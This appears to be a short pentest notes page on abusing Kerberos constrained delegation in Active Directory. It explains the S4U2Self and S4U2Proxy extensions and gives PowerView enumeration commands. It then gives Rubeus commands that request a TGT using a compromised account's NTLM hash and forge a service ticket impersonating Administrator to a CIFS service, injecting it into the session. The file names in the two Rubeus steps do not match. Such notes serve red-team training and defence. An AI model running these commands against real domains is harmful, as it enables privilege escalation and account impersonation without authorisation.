# Constrained Delegation

## Constrained Delegation

Created to solve the double hop kerberos issue.\
\
Since the Kerberos protocol does not natively support constrained delegation by default,Microsoft released two extensions for this feature: S4U2Self and S4U2Proxy\
\
&#x20;Together, these extensions solve the double-hop issue and limit access to only the desired backend service.\
\
&#x20;Constrained delegation is configured on the computer or user object. It is set through the msdsallowedtodelegateto property by specifying the SPNs the current object is allowed constraineddelegation against.\
\
\- S4U2self = Allows a service to obtain a forwardable TGS to itself on behalf of the user\
\- S4U2proxy = Allows a service to obtain a TGS to a second service on behalf of the user\
\
Contrained Delegation can be used on both **Users and Computers Objects**

![](<../../../../.gitbook/assets/image (312).png>)

### Powerview Enumeration&#x20;

```csharp
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

![](<../../../../.gitbook/assets/image (294).png>)

### Rubeus

#### Request a TGT for the compromised account

```csharp
.\Rubeus.exe asktgt /user:web01 /domain:crook.badcorp.local /rc4:<NTLM Hash> /outfile:t.kirbi
```

#### Inject the ticket&#x20;

```csharp
.\rubeus.exe s4u /user:web01$ /ticket:2.kirbi /impersonateuser:Administrator /msdsspn:"CIFS/HELPDESK" /ptt
```
